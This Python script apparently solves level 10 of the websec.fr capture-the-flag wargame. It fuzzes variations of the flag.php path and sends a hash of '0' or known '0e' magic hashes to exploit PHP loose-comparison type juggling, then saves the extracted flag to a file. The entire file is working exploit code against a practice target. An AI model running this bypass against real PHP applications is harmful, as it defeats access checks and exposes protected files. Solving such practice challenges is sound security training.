#!/usr/bin/env python3
import hashlib
import requests
import time

url = "https://websec.fr/level10/index.php"

# Generar muchas variaciones de paths que podrían hacer que el hash sea 0e...
paths = []

# Paths con diferentes prefijos/sufijos
for prefix in ["", ".", "./", "../", "///", "////", "level10/"]:
    for suffix in ["", "/", "//", "///"]:
        paths.append(f"{prefix}flag.php{suffix}")

# Paths con dots y slashes
for i in range(1, 20):
    paths.append("." * i + "/flag.php")
    paths.append("/" * i + "flag.php")
    paths.append("." + "/" * i + "flag.php")

print(f"Probando {len(paths)} variaciones de paths con hash '0'...")

for i, path in enumerate(paths):
    if i % 20 == 0:
        print(f"Progreso: {i}/{len(paths)}")
    
    try:
        # Probar con hash "0" para type juggling
        r = requests.get(url, params={"f": path, "hash": "0"}, timeout=5)
        
        if "Permission denied" not in r.text:
            if "<?php" in r.text or len(r.text) > 2000:
                print(f"\n¡Respuesta diferente con path: {path}!")
                if "WEBSEC{" in r.text:
                    flag_start = r.text.find("WEBSEC{")
                    flag_end = r.text.find("}", flag_start)
                    if flag_end > flag_start:
                        flag = r.text[flag_start:flag_end+1]
                        print(f"¡¡¡FLAG ENCONTRADA!!!: {flag}")
                        with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                            f.write(f"FLAG: {flag}\nPath: {path}\nHash: 0\n")
                        exit(0)
                else:
                    print(f"  Respuesta larga: {len(r.text)} bytes")
    except Exception as e:
        continue
    
    time.sleep(0.05)

print("\nNo encontrado con hash '0'. Probando con otros hashes 0e...")

# Probar con varios hashes 0e conocidos
magic_hashes = [
    "0e215962017",
    "0e730083352",
    "0e462097431",
    "0e830400451",
    "0e545993274",
    "0e342768416",
    "0e174594266",
    "0e509366587",
]

for hash_val in magic_hashes:
    print(f"\nProbando con hash: {hash_val}")
    for path in ["flag.php", "./flag.php", "level10/flag.php"]:
        try:
            r = requests.get(url, params={"f": path, "hash": hash_val}, timeout=5)
            if "WEBSEC{" in r.text:
                flag_start = r.text.find("WEBSEC{")
                flag_end = r.text.find("}", flag_start)
                flag = r.text[flag_start:flag_end+1]
                print(f"¡¡¡FLAG!!!: {flag}")
                with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                    f.write(f"FLAG: {flag}\nPath: {path}\nHash: {hash_val}\n")
                exit(0)
        except:
            continue

print("\nBúsqueda completada sin éxito.")